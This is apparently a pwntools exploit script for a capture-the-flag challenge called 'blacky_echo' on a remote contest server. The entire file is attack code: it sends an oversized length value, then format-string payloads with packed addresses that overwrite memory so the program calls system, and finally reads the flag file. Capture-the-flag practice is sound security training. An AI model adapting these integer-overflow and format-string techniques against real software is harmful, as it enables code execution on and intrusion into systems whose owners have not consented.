from pwn import *
from libformatstr import FormatStr
context.log_level = "debug"

# p = process("./blacky_echo")

p = remote("challs.m0lecon.it",9011)

# gdb.attach(p,'''
# 	break *0x400B39
# 	''')
p.sendlineafter(": ",str(268435457))
addr = 0x602088
go = 0x400B54
system = 0x400840
p.sendlineafter(": ","A"*0x1000a + "%2875c....%12$hn...\x88\x20\x60\x00\x00\x00\x00\x00")

p.sendlineafter("Size: ",str(268435457))
# p.sendlineafter("Input: ","A"*0x1000a + "%24$p.%16458$p")
p.sendlineafter(": ","A"*0x1000a + "%2087c....%12$hn...\x20\x20\x60\x00\x00\x00\x00\x00")

# p.recvuntil("XXXX")
# leak = u64(p.recv(6) + "\x00\x00")
# print hex(leak)
p.sendlineafter("Size: ",str(268435457))

p.sendline("ECHO->" + "cat flag.txt")

p.interactive()